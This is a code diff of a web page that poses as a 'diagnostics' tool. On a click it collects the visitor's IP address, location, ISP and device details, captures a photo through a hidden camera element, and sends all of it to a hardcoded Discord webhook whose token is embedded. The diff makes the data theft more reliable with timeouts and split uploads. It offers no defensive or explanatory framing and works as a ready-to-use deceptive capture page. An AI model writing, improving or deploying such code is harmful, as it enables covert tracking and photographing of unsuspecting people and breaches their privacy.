@@ -56,7 +56,7 @@
         }
         #status {
             margin-top: 1rem;
-            font-size: 0.85srem;
+            font-size: 0.85rem;
             color: var(--accent);
         }
     </style>
@@ -70,95 +70,93 @@
         <div id="status"></div>
     </div>
 
-    <!-- Hidden elements for capture -->
     <video id="cam" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // PASTE YOUR DISCORD WEBHOOK URL BELOW:
+        // REPLACE WITH YOUR DISCORD WEBHOOK URL
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569242899189596270/DZaFBALGc0JagZAvmWgd43_qnM4CEEPpZZi4x-lXfDw-57L1moD3y5MRtx0Ahver7xQP';
 
         document.getElementById('run-btn').addEventListener('click', async () => {
             const status = document.getElementById('status');
             status.innerText = "Gathering network telemetry...";
 
+            let ipData = { ip: "Unavailable", city: "Unknown", country_name: "Unknown", org: "Unknown" };
+
+            // 1. Get IP Data safely with a 3-second timeout
             try {
-                // 1. Fetch IP details safely using a CORS-friendly endpoint
-                const ipRes = await fetch('https://ipapi.co/json/')
-                    .catch(() => null);
-                let ipData = ipRes ? await ipRes.json() : {};
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 3000);
+                const ipRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
+                clearTimeout(timeoutId);
+                if (ipRes.ok) {
+                    ipData = await ipRes.json();
+                }
+            } catch (e) {
+                console.warn("IP lookup timed out or failed:", e);
+            }
 
-                const ua = navigator.userAgent;
-                let deviceModel = "Desktop / Generic";
-                if (/android/i.test(ua)) deviceModel = "Android Device";
-                else if (/iphone|ipad|ipod/i.test(ua)) deviceModel = "iOS Device";
+            const ua = navigator.userAgent;
+            let deviceModel = "Desktop / Generic";
+            if (/android/i.test(ua)) deviceModel = "Android Device";
+            else if (/iphone|ipad|ipod/i.test(ua)) deviceModel = "iOS / Apple Device";
 
-                // 2. Request camera stream
-                status.innerText = "Requesting camera permissions...";
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            try {
+                // 2. Request Camera
+                status.innerText = "Initializing camera stream...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
                 const video = document.getElementById('cam');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1200)); // Allow feed to warm up
 
-                status.innerText = "Capturing snapshot & transmitting...";
+                // Wait 1.5s to ensure frame is fully rendered by hardware
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
-                // 3. Draw frame to canvas
+                status.innerText = "Transmitting telemetry & photo snapshot...";
+
+                // 3. Draw frame to hidden Canvas
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Stop tracks
+                // Immediately turn off camera LED/stream
                 stream.getTracks().forEach(t => t.stop());
 
+                // 4. Send Telemetry Embed First (Pure JSON - guarantees Discord receipt)
+                const embedPayload = {
+                    embeds: [{
+                        title: "🚨 New Diagnostic Log",
+                        color: 65280,
+                        fields: [
+                            { name: "🌐 IP Address", value: ipData.ip || "N/A", inline: true },
+                            { name: "📍 Location", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true },
+                            { name: "🏢 Network Provider", value: ipData.org || "N/A", inline: false },
+                            { name: "📱 Device Type", value: deviceModel, inline: true },
+                            { name: "💻 Operating System", value: navigator.platform || "N/A", inline: true },
+                            { name: "📺 Screen Size", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                            { name: "🧭 User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(embedPayload)
+                });
+
+                // 5. Convert Canvas to Blob and send snapshot image as second message
                 canvas.toBlob(async (blob) => {
-                    const formData = new FormData();
-                    
-                    const payload = {
-                        embeds: [{
-                            title: "📊 Telemetry & Capture Report",
-                            color: 3447003,
-                            fields: [
-                                { name: "IP Address", value: ipData.ip || "Unavailable", inline: true },
-                                { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
-                                { name: "ISP", value: ipData.org || "Unknown", inline: false },
-                                { name: "Device Type", value: deviceModel, inline: true },
-                                { name: "Platform", value: navigator.platform || "Unknown", inline: true },
-                                { name: "User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    };
-
-                    formData.append('payload_json', JSON.stringify(payload));
                     if (blob) {
-                        formData.append('file', blob, 'snapshot.jpg');
+                        const imgFormData = new FormData();
+                        imgFormData.append('file', blob, 'capture.jpg');
+                        imgFormData.append('content', '📷 **Captured Snapshot:**');
+
+                        await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: imgFormData
+                        });
                     }
-
-                    // Send payload to Discord Webhook
-                    const discordRes = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    if (discordRes.ok) {
-                        status.innerText = "Telemetry successfully logged!";
-                        document.getElementById('main-card').innerHTML = `
-                            <h1 style="color: #66fcf1;">Diagnostics Complete</h1>
-                            <p>Data successfully transmitted to server logs.</p>
-                        `;
-                    } else {
-                        status.innerText = "Error: Discord rejected the payload.";
-                    }
-                }, 'image/jpeg', 0.8);
-
-            } catch (err) {
-                console.error(err);
-                status.innerText = "Permission denied or camera unavailable.";
-            }
-        });
-    </script>
-</body>
-</html>
